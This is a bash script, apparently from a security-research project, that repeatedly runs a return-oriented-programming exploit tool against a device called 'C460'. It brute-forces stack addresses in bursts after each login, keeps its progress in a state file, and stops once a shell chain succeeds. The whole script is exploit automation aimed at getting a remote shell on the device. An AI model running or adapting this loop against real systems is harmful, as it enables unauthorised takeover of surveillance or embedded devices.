#!/bin/bash
# Incremental C460 stack-address sweep — v4: burst tool does ONE login + N shots per wake.
cd /Users/jemanuel/projects/franken_surveillance_system
STATE=/tmp/c460_sweep_incremental.idx
[ -s "$STATE" ] && IDX=$(cat "$STATE") || IDX=0
BURST=12
LOG=/tmp/c460_incremental_sweep.log
PY=/opt/homebrew/bin/python3
log() { echo "$(date '+%H:%M:%S') $*" >> "$LOG"; }

log "incremental sweep v4 starting from index $IDX (burst=$BURST)"
while true; do
  OUT=$(sudo -n $PY deliverables/scripts/rop_burst.py $IDX $BURST 2>&1 | tail -1)
  log "burst result: $OUT"
  # refresh state from the tool (it persists idx per shot)
  [ -s "$STATE" ] && IDX=$(cat "$STATE") || IDX=0
  case "$OUT" in
    *shell*) log "SHELL CHAIN COMPLETE — sweep exiting"; exit 0 ;;
    *no-login*) sleep 30 ;;
    *burst-done*) sleep 20 ;;
    *) sleep 20 ;;
  esac
done
